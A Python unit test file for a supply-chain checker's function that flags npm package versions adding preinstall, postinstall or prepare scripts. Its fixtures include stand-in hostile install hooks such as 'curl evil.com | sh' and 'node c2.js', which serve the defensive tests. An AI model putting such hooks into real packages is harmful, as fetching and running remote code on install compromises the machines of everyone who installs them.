"""Tests for diff_capabilities() in fenceline.check.capabilities.

check_capabilities() and check_pypi_capabilities() are already tested
in test_provenance.py. This file covers the version-comparison logic.
"""

from fenceline.check.capabilities import diff_capabilities


def _make_info(scripts_by_version: dict) -> dict:
    """Build a fake npm registry info dict with scripts per version."""
    versions = {}
    for ver, scripts in scripts_by_version.items():
        versions[ver] = {"scripts": scripts}
    return {"versions": versions}


class TestDiffCapabilities:
    def test_detects_postinstall_added(self):
        info = _make_info({
            "1.0.0": {},
            "1.1.0": {"postinstall": "node hack.js"},
        })
        signals = diff_capabilities(info, "1.0.0", "1.1.0")
        assert "capability_escalation_postinstall" in signals

    def test_detects_preinstall_added(self):
        info = _make_info({
            "2.0.0": {"postinstall": "echo done"},
            "2.1.0": {"postinstall": "echo done", "preinstall": "curl evil.com"},
        })
        signals = diff_capabilities(info, "2.0.0", "2.1.0")
        assert "capability_escalation_preinstall" in signals
        assert "capability_escalation_postinstall" not in signals  # was already there

    def test_detects_prepare_added(self):
        info = _make_info({
            "1.0.0": {},
            "1.0.1": {"prepare": "node build.js"},
        })
        signals = diff_capabilities(info, "1.0.0", "1.0.1")
        assert "capability_escalation_prepare" in signals

    def test_no_escalation_when_scripts_unchanged(self):
        info = _make_info({
            "1.0.0": {"postinstall": "echo done"},
            "1.0.1": {"postinstall": "echo updated"},
        })
        signals = diff_capabilities(info, "1.0.0", "1.0.1")
        assert signals == []

    def test_no_escalation_when_scripts_removed(self):
        info = _make_info({
            "1.0.0": {"postinstall": "echo done", "preinstall": "echo pre"},
            "2.0.0": {},
        })
        signals = diff_capabilities(info, "1.0.0", "2.0.0")
        assert signals == []

    def test_returns_empty_when_old_version_is_none(self):
        """New package — no old version to compare against."""
        info = _make_info({"1.0.0": {"postinstall": "node hack.js"}})
        signals = diff_capabilities(info, None, "1.0.0")
        assert signals == []

    def test_multiple_escalations_at_once(self):
        info = _make_info({
            "1.0.0": {},
            "1.1.0": {
                "preinstall": "curl evil.com | sh",
                "postinstall": "node c2.js",
                "prepare": "node build.js",
            },
        })
        signals = diff_capabilities(info, "1.0.0", "1.1.0")
        assert len(signals) == 3
        assert "capability_escalation_preinstall" in signals
        assert "capability_escalation_postinstall" in signals
        assert "capability_escalation_prepare" in signals

    def test_handles_missing_version_in_registry(self):
        """If version not in registry data, capabilities are empty."""
        info = _make_info({"1.0.0": {"postinstall": "echo done"}})
        # "2.0.0" doesn't exist — check_capabilities returns []
        signals = diff_capabilities(info, "1.0.0", "2.0.0")
        # postinstall was in 1.0.0 but not in 2.0.0 (missing = no scripts)
        assert signals == []

    def test_handles_empty_versions(self):
        info = {"versions": {}}
        signals = diff_capabilities(info, "1.0.0", "1.1.0")
        assert signals == []
